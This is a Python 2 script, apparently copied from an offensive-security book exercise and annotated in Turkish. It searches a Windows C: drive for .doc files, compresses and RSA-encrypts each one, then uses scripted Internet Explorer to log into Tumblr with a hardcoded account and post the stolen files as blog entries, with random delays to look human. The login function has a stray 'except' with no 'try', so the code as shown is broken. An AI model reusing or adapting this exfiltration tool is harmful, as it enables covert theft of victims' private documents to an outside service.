import win32com.client
import os
import fnmatch
import time
import random
import zlib

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doc_type = ".doc" # arayacagimiz belge turleri
username = "jms@bughunter.ca" #tumblr kullancii adi ve parola
password = "justinBHP2014"
public_key = "" # key icin bir yer tutucu

def wait_for_browser(browser):
    # wait for the browser to finish loading a page
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)
    return



def encrypt_string(plaintext): # dosya adini ve dosya icerigini sifreleyebilmemiz icin sifreleme rutinlerimizi ekleyelim.
    
    chunk_size = 256 # bu fonksiyon ilk olarak olusturdugumuz genel anahtari kullanarak rsa acik anahtar sifreleme nesnemizi kurmadan once dosyaya zlib skstrmasi uygulamaktadir.
    print "Compressing: %d bytes" % len(plaintext)
    plaintext = zlib.compress(plaintext)
    
    print "Encrypting %d bytes" % len(plaintext)
    
    rsakey = RSA.importKey(public_key)
    rsakey = PKCS1_OAEP.new(rsakey)
    
    encrypted = ""
    offset = 0
    
    while offset < len(plaintext):# dhaa sonra dosya icerikleri arasinda dongu olusturmaya ve pycrrpto kullnaarak rsa sifrelmesi icin maksimium boyut olan 256 baytlik parcalar halinde sifrelemeye basliyoruz.
        chunk = plaintext[offset:offset+chunk_size]
        
        if len(chunk) % chunk_size != 0: # dosyanin son parcasiyla karsilastigimiza eger 256 bayt uzunlugunda degilse onu basarili bir sekilde sifrelemk iicn ve diger yerlde cozebilmek iicn bosluklarla dolduruyoruz.
            chunk += " " * (chunk_size - len(chunk))
            
        encrypted += rsakey.encrypt(chunk)
        offset += chunk_size
        
    encrypted = encrypted.encode("base64")# tum hepsi tmamalaninca dondurmak icin base64 ile decode base64 u tumblr blogumuza sorunsuz veya garip kodlama sorunlri olmadan gonderebilmek icin kullaniyoruz.
    
    print "Base64 encoded crypto: %d" % len(encrypted)
    
    return encrypted

def encrypt_post(filename): # dosya adini almaktan ve hem sifrelenmis dosya adini hem de sifrelenmis dosya iceriklerini base64 kodlu bicimde dondurmekten sorumludur. rumblrdaki blog yazimiz basligi hedef dosyanini adi 
    
    # open and read the file
    
    fd = open(filename,"rb")
    contents = fd.read()
    fd.close()
    
    encrypted_title = encrypt_string(filename) # diger fonksiyona yollar o da
    encrypted_body = encrypt_string(contents)
    
    return encrypted_title,encrypted_body


def random_sleep():
    time.sleep(random.randint(5,10))
    return


def login_to_tumblr(ie):#dom icindeki tum ogeleri alarak baslar ve e-posta ve sifre alanlarini arra
    
    # retrieve all elements in the document
    full_doc = ie.Document.all
    
    # iterate looking for the login form bunlari sagladimiz kimlik bilgileirne ayarlar bir hesap acamyi unutma !!
    for i in full_doc:
        if i.id == "signup_email":
            i.setAttribute("value",username)
        elif i.id == "signup_password":
            i.setAttribute("value",password)
    
    random_sleep()
    
    # you can be presented with different home pages tumblr her ziyarette biraz farkli bir giris ekrani sunabilir boylece sonraki kod parcasi sadece giris formunu bulmaya ve buna gore  gondermeye calisir  bu kod calistirildiktan sonra simdi tumblr panosuna giris yapmali ve bazi bilgileri gondereye hazir olmaliyiz.
    if ie.Document.forms[0].id == "signup_form":
        ie.Document.forms[0].submit()
    else:
        ie.Document.forms[1].submit()
    except IndexError, e:
        pass
    
    random_sleep()
    
    # the login form is the second form on the page
    wait_for_browser(ie)
    
    return


def post_to_tumblr(ie,title,post):# tarayicinin bir ornegini sifrelenmis dosya adini ve gonderilecek dosya icerigini alir
    
    full_doc = ie.Document.all
    
    for i in full_doc: # blog gonderiisnin basligini ve govde metini nereye gonderecegimizi bulmak icin domda arama yapiyoruz.
        if i.id == "post_one":
            i.setAttribute("value",title)
            title_box = i
            i.focus()
        elif i.id == "post_two":
            i.setAttribute("innerHTML",post)
            print "Set text area"
            i.focus()
        elif i.id == "create_post":
            print "Found post button"
            post_form = i
            i.focus()
        
    # move focus away from the main content box
    random_sleep()
    title_box.focus()
    random_sleep()
    
    # post the form
    post_form.children[0].click()
    wait_for_browser(ie)
    
    random_sleep()
    
    return


def exfiltrate(document_path):#tumblrda saklamak istedigimiz her belge icin disari sizidrma islevimiz exfiltrate function arayacagiz.
    
    ie = win32com.client.Dispatch("InternetExplorer.Application")# ienin yeni bir objesini olustururve islemi gorunur veya gizli olarak ayarlayaiblirsiniz.
    ie.Visible = 1
    
    # head to tumblr and login
    ie.Navigate("http://www.tumblr.com/login")
    wait_for_browser(ie)
    
    print "Logging in..."
    login_to_tumblr(ie)
    print "Logged in...navigating"
    
    ie.Navigate("https://www.tumblr.com/new/text")
    wait_for_browser(ie)
    
    # encrypt the file
    title,body = encrypt_post(document_path)
    
    print "Creating new post..."
    post_to_tumblr(ie,title,body)
    print "Posted!"
    
    # destroy the IE instance tum yardimci funcitonlari cagirdiktan sonra ie ornegimizi oldurur ve geri doneriz
    ie.Quit()
    ie = None
    
    return

# main loop for document discovery
# NOTE: no tab for first line of code below komut dosyamizin son biti hedef sistemdeki c:\ sürücüsünde gezinemkten ve onceden belirlenmis dosya uzantimizla(bu durumda .doc) eslesmeye calismaktan sorumludur. Bir dosya her bulundugunda dosyanin tam yolunu disari sizdirma islevimize aktaririz.
for parent, directories, filenames in os.walk("C:\\"):
    for filename in fnmatch.filter(filenames,"*%s" % doc_type):
        document_path = os.path.join(parent,filename)
        print "Found: %s" % document_path
        exfiltrate(document_path)
        raw_input("Continue?")
